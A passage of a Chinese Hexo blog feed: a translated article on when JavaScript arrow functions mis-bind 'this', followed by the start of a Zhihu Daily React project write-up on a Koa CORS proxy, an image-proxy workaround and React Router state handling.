定义字面量方法</h3><p>因为箭头函数的语法很简洁，可能不少同学会忍不住用它来定义字面量方法，比如下面的例子：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> calculator = &#123;</span><br><span class="line">    array: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    sum: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// =&gt; true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.array.reduce(<span class="function">(<span class="params">result, item</span>) =&gt;</span> result + item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// =&gt; true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Throws "TypeError: Cannot read property 'reduce' of undefined"</span></span><br><span class="line">calculator.sum();</span><br></pre></td></tr></table></figure></p><p>calculator.sum 使用箭头函数来定义，但是调用的时候会抛出 TypeError，因为运行时 this.array 是未定义的，调用 calculator.sum 的时候，执行上下文里面的 this 仍然指向的是 window，原因是箭头函数把函数上下文绑定到了 window 上，this.array 等价于 window.array，显然后者是未定义的。</p><p>解决的办法是，使用函数表达式或者方法简写（ES6 中已经支持）来定义方法，这样能确保 this 是在运行时是由包含它的上下文决定的，修正后的代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> calculator = &#123;</span><br><span class="line">    array: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">    sum() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span> === calculator); <span class="comment">// =&gt; true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.array.reduce(<span class="function">(<span class="params">result, item</span>) =&gt;</span> result + item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">calculator.sum(); <span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><p>这样 calculator.sum 就变成了普通函数，执行时 this 就指向 calculator 对象，自然能得到正确的计算结果。</p><p>——————————–赵志文的分割线开始—————————–</p><p>补充一个在sg看到的提问：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name=<span class="string">"window"</span>;</span><br><span class="line"><span class="keyword">var</span> obj=&#123;</span><br><span class="line">  name:<span class="string">'netease'</span>,</span><br><span class="line">   print1:<span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.print1();<span class="comment">//window</span></span><br></pre></td></tr></table></figure><p>题主描述：es6中的this是定义时绑定，跟运行时无关，我很纳闷就是这个例子中，定义时 print1方法里面的this不是应该最先查找到的就是obj里面的name吗，为什么输出是window，还是绑定到全局变量上去了?不是明明print1里面没有this，再查找外围this，先找到的应该是obj中的this吗？</p><p>最佳回答：</p><blockquote><p>箭头函数没有 this/super/arguments/new.target的绑定，这些值是由外围最近一层非箭头函数决定。</p></blockquote><p>箭头函数的this和普通函数的this可以看成完全两个概念的东西，不用传统的this去理解。</p><p>我对外围的理解是，这个外围指的是()=&gt;{}整体的外围，比如你的代码中：name属性的外围是什么？print1的外围是什么？。所以 ()=&gt;{console.log(this.name);}的外围已经出了obj，从而进入window<br>可以借助我下面的代码来理解：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> name = <span class="string">"window"</span>;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        name: <span class="string">'netease'</span>,</span><br><span class="line">        print1: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">        &#125;,</span><br><span class="line">        print3: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="function"><span class="params">()</span>=&gt;</span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    obj.print1();<span class="comment">// window</span></span><br><span class="line">    obj.print3()();<span class="comment">// netease 注意是返回闭包函数</span></span><br></pre></td></tr></table></figure></p><p>——————————–赵志文的分割线结束—————————–</p><h3 id="1-2-定义原型方法"><a href="#1-2-定义原型方法" class="headerlink" title="1.2 定义原型方法"></a>1.2 定义原型方法</h3><p>同样的规则适用于原型方法（prototype method）的定义，使用箭头函数会导致运行时的执行上下文错误，比如下面的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Cat.prototype.sayCatName = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// =&gt; true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> Cat(<span class="string">'Mew'</span>);</span><br><span class="line">cat.sayCatName(); <span class="comment">// =&gt; undefined</span></span><br></pre></td></tr></table></figure><p>使用传统的函数表达式就能解决问题：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Cat</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Cat.prototype.sayCatName = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === cat); <span class="comment">// =&gt; true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cat = <span class="keyword">new</span> Cat(<span class="string">'Mew'</span>);</span><br><span class="line">cat.sayCatName(); <span class="comment">// =&gt; 'Mew'</span></span><br></pre></td></tr></table></figure><p>sayCatName 变成普通函数之后，被调用时的执行上下文就会指向新创建的 cat 实例。</p><p>——————————–赵志文的分割线开始—————————–</p><p>来看看ES6中的class定义方法（传统写法、箭头函数写法）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span> </span>&#123; </span><br><span class="line"></span><br><span class="line">  Run() &#123;    <span class="comment">//传统形式的函数写法</span></span><br><span class="line">    <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  eat = <span class="function"><span class="params">()</span> =&gt;</span> &#123;    <span class="comment">//es6中的箭头函数写法</span></span><br><span class="line">    <span class="keyword">this</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在ES5中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Person = (<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> _this = <span class="keyword">this</span>;</span><br><span class="line">        <span class="keyword">this</span>.eat = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;    <span class="comment">//箭头写法直接挂到Person的this下</span></span><br><span class="line">            _this;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    Person.prototype.Run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;    <span class="comment">//传统写法则挂到prototype中定义</span></span><br><span class="line">        <span class="keyword">this</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Person;</span><br><span class="line">&#125;());</span><br></pre></td></tr></table></figure><p>所以在ES6的class中定义的传统形式的函数写法是挂在到prototype上的，但是箭头函数并不是直接将挂载在原型上的函数写为箭头形式，而是在构造函数内定义。</p><p>直接在ES6的class中定义箭头函数方法，this是可以指向实例的(外层是构造函数，this指向实例)。</p><p>但是在ES5的原型上挂载箭头函数方法this就无法指向实例了（参考上文）。</p><p>——————————–赵志文的分割线结束—————————–</p><h2 id="2-定义事件回调函数"><a href="#2-定义事件回调函数" class="headerlink" title="2. 定义事件回调函数"></a>2. 定义事件回调函数</h2><p>this 是 JS 中很强大的特性，可以通过多种方式改变函数执行上下文，JS 内部也有几种不同的默认上下文指向，但普适的规则是在谁上面调用函数 this 就指向谁，这样代码理解起来也很自然，读起来就像在说，某个对象上正在发生某件事情。</p><p>但是，箭头函数在声明的时候就绑定了执行上下文，要动态改变上下文是不可能的，在需要动态上下文的时候它的弊端就凸显出来。比如在客户端编程中常见的 DOM 事件回调函数（event listenner）绑定，触发回调函数时 this 指向当前发生事件的 DOM 节点，而动态上下文这个时候就非常有用，比如下面这段代码试图使用箭头函数来作事件回调函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'myButton'</span>);</span><br><span class="line">button.addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// =&gt; true</span></span><br><span class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">'Clicked button'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在全局上下文下定义的箭头函数执行时 this 会指向 window，当单击事件发生时，浏览器会尝试用 button 作为上下文来执行事件回调函数，但是箭头函数预定义的上下文是不能被修改的，这样 this.innerHTML 就等价于 window.innerHTML，而后者是没有任何意义的。</p><p>使用函数表达式就可以在运行时动态的改变 this，修正后的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> button = <span class="built_in">document</span>.getElementById(<span class="string">'myButton'</span>);</span><br><span class="line">button.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === button); <span class="comment">// =&gt; true</span></span><br><span class="line">    <span class="keyword">this</span>.innerHTML = <span class="string">'Clicked button'</span>;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>当用户单击按钮时，事件回调函数中的 this 实际指向 button，这样的 this.innerHTML = ‘Clicked button’ 就能按照预期修改按钮中的文字。</p><h2 id="3-定义构造函数"><a href="#3-定义构造函数" class="headerlink" title="3. 定义构造函数"></a>3. 定义构造函数</h2><p>构造函数中的 this 指向新创建的对象，当执行 new Car() 的时候，构造函数 Car 的上下文就是新创建的对象，也就是说 this instanceof Car === true。显然，箭头函数是不能用来做构造函数， 实际上 JS 会禁止你这么做，如果你这么做了，它就会抛出异常。</p><p>换句话说，箭头构造函数的执行并没有任何意义，并且是有歧义的。比如，当我们运行下面的代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Message = <span class="function">(<span class="params">text</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">this</span>.text = text;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// Throws "TypeError: Message is not a constructor"</span></span><br><span class="line"><span class="keyword">const</span> helloMessage = <span class="keyword">new</span> Message(<span class="string">'Hello World!'</span>);</span><br></pre></td></tr></table></figure><p>构造新的 Message 实例时，JS 引擎抛了错误，因为 Message 不是构造函数。在笔者看来，相比旧的 JS 引擎在出错时悄悄失败的设计，ES6 在出错时给出具体错误消息是非常不错的实践。可以通过使用函数表达式或者函数声明 来声明构造函数修复上面的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Message = <span class="function"><span class="keyword">function</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.text = text;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> helloMessage = <span class="keyword">new</span> Message(<span class="string">'Hello World!'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(helloMessage.text); <span class="comment">// =&gt; 'Hello World!'</span></span><br></pre></td></tr></table></figure><h2 id="4-追求过短的代码"><a href="#4-追求过短的代码" class="headerlink" title="4. 追求过短的代码"></a>4. 追求过短的代码</h2><p>箭头函数允许你省略参数两边的括号、函数体的花括号、甚至 return 关键词，这对编写更简短的代码非常有帮助。这让我想起大学计算机老师给学生留过的有趣作业：看谁能使用 C 语言编写出最短的函数来计算字符串的长度，这对学习和探索新语言特性是个不错的法子。但是，在实际的软件工程中，代码写完之后会被很多工程师阅读，真正的 write once, read many times，在代码可读性方面，最短的代码可能并不总是最好的。一定程度上，压缩了太多逻辑的简短代码，阅读起来就没有那么直观，比如下面的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> multiply = <span class="function">(<span class="params">a, b</span>) =&gt;</span> b === <span class="literal">undefined</span> ? <span class="function"><span class="params">b</span> =&gt;</span> a * b : a * b;</span><br><span class="line"><span class="keyword">const</span> double = multiply(<span class="number">2</span>);</span><br><span class="line">double(<span class="number">3</span>);      <span class="comment">// =&gt; 6</span></span><br><span class="line">multiply(<span class="number">2</span>, <span class="number">3</span>); <span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><p>multiply 函数会返回两个数字的乘积或者返回一个可以继续调用的固定了一个参数的函数。代码看起来很简短，但大多数人第一眼看上去可能无法立即搞清楚它干了什么，怎么让这段代码可读性更高呢？有很多办法，可以在箭头函数中加上括号、条件判断、返回语句，或者使用普通的函数：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">multiply</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (b === <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">b</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a * b;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a * b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> double = multiply(<span class="number">2</span>);</span><br><span class="line">double(<span class="number">3</span>); <span class="comment">// =&gt; 6</span></span><br><span class="line">multiply(<span class="number">2</span>, <span class="number">3</span>); <span class="comment">// =&gt; 6</span></span><br></pre></td></tr></table></figure><p>为了让代码可读性更高，在简短和啰嗦之间把握好平衡是非常有必要的。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>箭头函数无疑是 ES6 带来的重大改进，在正确的场合使用箭头函数能让代码变的简洁、短小，但某些方面的优势在另外一些方面可能就变成了劣势，在需要动态上下文的场景中使用箭头函数你要格外的小心，这些场景包括：定义对象方法、定义原型方法、定义构造函数、定义事件回调函数。</p><p>One More Thing</p><p>本文作者王仕军，商业转载请联系作者获得授权，非商业转载请注明出处。如果你觉得本文对你有帮助，请点赞！如果对文中的内容有任何疑问，欢迎留言讨论。想知道我接下来会写些什么？欢迎订阅我的知乎专栏：《前端周刊：让你在前端领域跟上时代的脚步》。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;什么时候你不能使用箭头函数？&quot;&gt;&lt;a href=&quot;#什么时候你不能使用箭头函数？&quot; class=&quot;headerlink&quot; title=&quot;什么时候你不能使用箭头函数？&quot;&gt;&lt;/a&gt;什么时候你不能使用箭头函数？&lt;/h1&gt;&lt;p&gt;译者：王仕军&lt;/p&gt;
&lt;blockquote
      
    
    </summary>
    
      <category term="js" scheme="http://yoursite.com/categories/js/"/>
    
    
      <category term="js" scheme="http://yoursite.com/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>ZhihuDaily-React项目总结</title>
    <link href="http://yoursite.com/2017/10/09/ZhihuDaily-React%E9%A1%B9%E7%9B%AE%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2017/10/09/ZhihuDaily-React项目总结/</id>
    <published>2017-10-09T11:35:52.000Z</published>
    <updated>2017-10-09T11:35:52.000Z</updated>
    
    <content type="html"><![CDATA[<p>API：<a href="https://github.com/izzyleung/ZhihuDailyPurify/wiki/%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5-API-%E5%88%86%E6%9E%90" target="_blank" rel="noopener">点这里，感谢</a></p><p>项目地址：<a href="https://github.com/hackerwen/ZhihuDaily-React" target="_blank" rel="noopener">Github</a></p><p>预览地址：<a href="http://112.74.202.2/" target="_blank" rel="noopener">初次加载有点慢…</a></p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-fa384335b62c2ea2?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="pc主页.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-b3d1a55cc163bb0e?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="移动端主页.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-f28324cf41e6b038?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="内容详情.png"></p><p><img src="http://upload-images.jianshu.io/upload_images/4869616-ff91fbcaadcbab49?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="评论.png"></p><h2 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h2><ul><li>框架：react</li><li>路由：react-router 4.0</li><li>HTTP请求：whatwg-fetch(主要是保证fetch兼容性)</li><li>设备判断：react-responsive</li><li>UI：antd(主要是PC端)</li><li>CSS预处理：stylus</li><li>移动端布局：flexible.js + rem</li></ul><h2 id="遇到的问题以及解决方法"><a href="#遇到的问题以及解决方法" class="headerlink" title="遇到的问题以及解决方法"></a>遇到的问题以及解决方法</h2><h3 id="API问题"><a href="#API问题" class="headerlink" title="API问题"></a>API问题</h3><h4 id="1-API不支持跨域"><a href="#1-API不支持跨域" class="headerlink" title="1. API不支持跨域"></a>1. API不支持跨域</h4><p>   那位大大的API是不支持跨域的，于是自己使用koa2+request-promise+koa-cors进行了后台API转发 ，代码如下，在源码的server/server.js中</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Koa = <span class="built_in">require</span>(<span class="string">'koa'</span>);</span><br><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">'koa-cors'</span>);</span><br><span class="line"><span class="keyword">const</span> rp = <span class="built_in">require</span>(<span class="string">'request-promise'</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> Koa();</span><br><span class="line"><span class="keyword">const</span> basrUrl = <span class="string">"http://news-at.zhihu.com"</span>;</span><br><span class="line"></span><br><span class="line">app.use(cors());</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> main = <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> pathname = ctx.request.path;</span><br><span class="line">    ctx.response.type = <span class="string">'json'</span>;</span><br><span class="line">    ctx.response.body = <span class="built_in">JSON</span>.parse(<span class="keyword">await</span> rp(basrUrl + pathname));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.use(main);</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">9999</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'app started at port 9999...'</span>);</span><br></pre></td></tr></table></figure><p>启动了服务后，对自己的本地服务器进行请求即可，只需要将原API的“<a href="http://news-at.zhihu.com”改为“http://localhost:9999”。" target="_blank" rel="noopener">http://news-at.zhihu.com”改为“http://localhost:9999”。</a></p><h4 id="2-知乎图片防盗链问题"><a href="#2-知乎图片防盗链问题" class="headerlink" title="2.知乎图片防盗链问题"></a>2.知乎图片防盗链问题</h4><p>“知乎的图片可能会通过请求头的referer参数判断，如果不是指定的域名会返回403，如果精通后台的同学，可以去访问这些图片来缓存这些图片，我是搜索到了一个相对简单一些的办法，点击链接，主要用到的是Images.weserv.nl这个网站，可以缓存图片，而且可以修改图片的尺寸大小。</p><p>具体是我自定义了一个过滤器，在需要用到地方，把知乎的url替换成这个图片代理网站的url，这样图片就可以显示了。”</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> replaceUrl = <span class="function">(<span class="params">srcUrl</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> srcUrl.replace(<span class="regexp">/http\w&#123;0,1&#125;:\/\/p/g</span>, <span class="string">'https://images.weserv.nl/?url=p'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对返回的data直接进行如下操作:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="built_in">JSON</span>.parse(replaceUrl(<span class="built_in">JSON</span>.stringify(data)));</span><br></pre></td></tr></table></figure><p>data中的图片就可以正常引用了。</p><blockquote><p>参考</p><ul><li><a href="http://www.yatessss.com/2016/07/08/%E4%BD%BF%E7%94%A8vue%E5%AE%8C%E6%88%90%E7%9F%A5%E4%B9%8E%E6%97%A5%E6%8A%A5web%E7%89%88.html" target="_blank" rel="noopener">使用vue完成知乎日报web版</a><br>这个博主做的vue版十分完善，使用vue的同学可以看看。</li></ul></blockquote><h3 id="React-React-Router4-0相关问题"><a href="#React-React-Router4-0相关问题" class="headerlink" title="React/React Router4.0相关问题"></a>React/React Router4.0相关问题</h3><h4 id="1-React-Router为何在url相同参数不同的情况下跳转但是并不刷新页面？"><a href="#1-React-Router为何在url相同参数不同的情况下跳转但是并不刷新页面？" class="headerlink" title="1.React Router为何在url相同参数不同的情况下跳转但是并不刷新页面？"></a>1.React Router为何在url相同参数不同的情况下跳转但是并不刷新页面？</h4><p>案情描述：当我从“日常心理学”主题日报跳转至“用户推荐日报”时，组件内部数据没有刷新，仍然为“日常心理学”的数据，而非“用户推荐日报”数据。</p><p>路由一：/topic/abc</p><p>路由二：/topic/efg</p><p>即路由一跳转至路由二组件没有重新去获取数据，其实这个问题在vue-router里面也有，vue中是通过watch监测路由参数变化判断组件是否需要刷新。</p><p>解决方案：我们一般是在componentDidMount中获取数据，当我从路由一跳转至路由二，仍然为同一组件，所以并没有重新Mount。</p><p>也就是说，同级路由相同组件跳转的情况下，componentDidMount方法仅仅在第一次Mount的时候触发了，路由跳转并没有触发该方法。</p><p>但是路由跳转之后 props.params 变了, 我们可以在componentWillReceiveProps中进行第二次的数据拉取，于是会触发更新过程。</p><blockquote><p>参考：</p><ul><li><a href="https://segmentfault.com/q/1010000009309279" target="_blank" rel="noopener">React Router为何在url相同参数不同的情况下跳转但是并不刷新页面？</a></li></ul></blockquote><h4 id="2-如何保持路由组件keep-alive，跳转返回后不重新渲染"><a href="#2-如何保持路由组件keep-alive，跳转返回后不重新渲染" class="headerlink" title="2. 如何保持路由组件keep-alive，跳转返回后不重新渲染"></a>2. 如何保持路由组件keep-alive，跳转返回后不重新渲染</h4><p>案情描述：假如我有以下两种需求：</p><ol><li><p>有一个下拉加载更多列表页，当列表项达到1000项，点击列表项到详细页，当点击返回按钮时，保持列表页的一千条记录。</p></li><li><p>把下拉加载更改为翻页，假设不是通过改变URL，只是单纯的ajax请求，击列表项到详细页，当点击返回按钮时，返回离开时的那一页。</p></li></ol><p>其实我之前也写过篇文章，<a href="http://www.jianshu.com/p/869e5c2e45cb" target="_blank" rel="noopener">戳这里</a></p><p>某一天我很无聊，正在刷知乎日报，我要完成一个目标：从2017-10-07号一直看到2017-01-01。</p><p>我一直看到了10-05的信息，此时列表已经较长了，点进去，看完了，返回，组件重新渲染，滚动条还原，数据还原，我又下拉到三天前，又看了一篇文章，返回，重复上述操作。</p><p>随着列表越来越长，我每一次返回的代价都是巨大的，我都要重新拉回到之前看到的地方，且数据还要重新加载，因为每次返回只能返回latest信息，无法返回你通过ajax下拉加载beforeNews的信息。</p><p>很显然，这个问题不解决，用户体验绝对负分。</p><p>解决方案：</p><p>方式一：</p><p>把加载页面的必要信息放URL里，后退就是浏览器的后退，回退时组件依然会重新渲染，componentDidMount的时候根据这些url的信息去请求API。数据保持离开时最新的状态。</p><p>这种方法在翻页情况下使用固然可以，但是像下拉加载那样，是多次请求的数据集合，就无法通过这种方式解决，而且后退时依旧进行了一次http请求。</p><p>方式二：</p><ol><li>在componentWillUnMount方法中存储当前已经加载的数据到本地(sessionStorage,localStorage)</li><li>详情回退后,从本地取出数据，进行渲染(所以componentDidMount内部要判断本地是否已经存在数据，如果存在则return，不存在从服务器获取数据)</li><li>这种方式回退时不需要再次进行http请求，也能满足下拉的情况，我选择的就是这种方式。</li></ol><blockquote><p>参考：</p><ul><li><a href="https://www.v2ex.com/amp/t/386516" target="_blank" rel="noopener">react-router-dom 怎么让第二个页面返回到第一个页面使得第一个页面不重新加载</a></li><li><a href="http://react-china.org/t/react-react-router/3757/2" target="_blank" rel="noopener">React 和react-router ,实现回退的时候，如何使页面回退到以前的状态</a></li></ul></blockquote><h4 id="3-后退时记录滚动条位置"><a href="#3-后退时记录滚动条位置" class="headerlink" 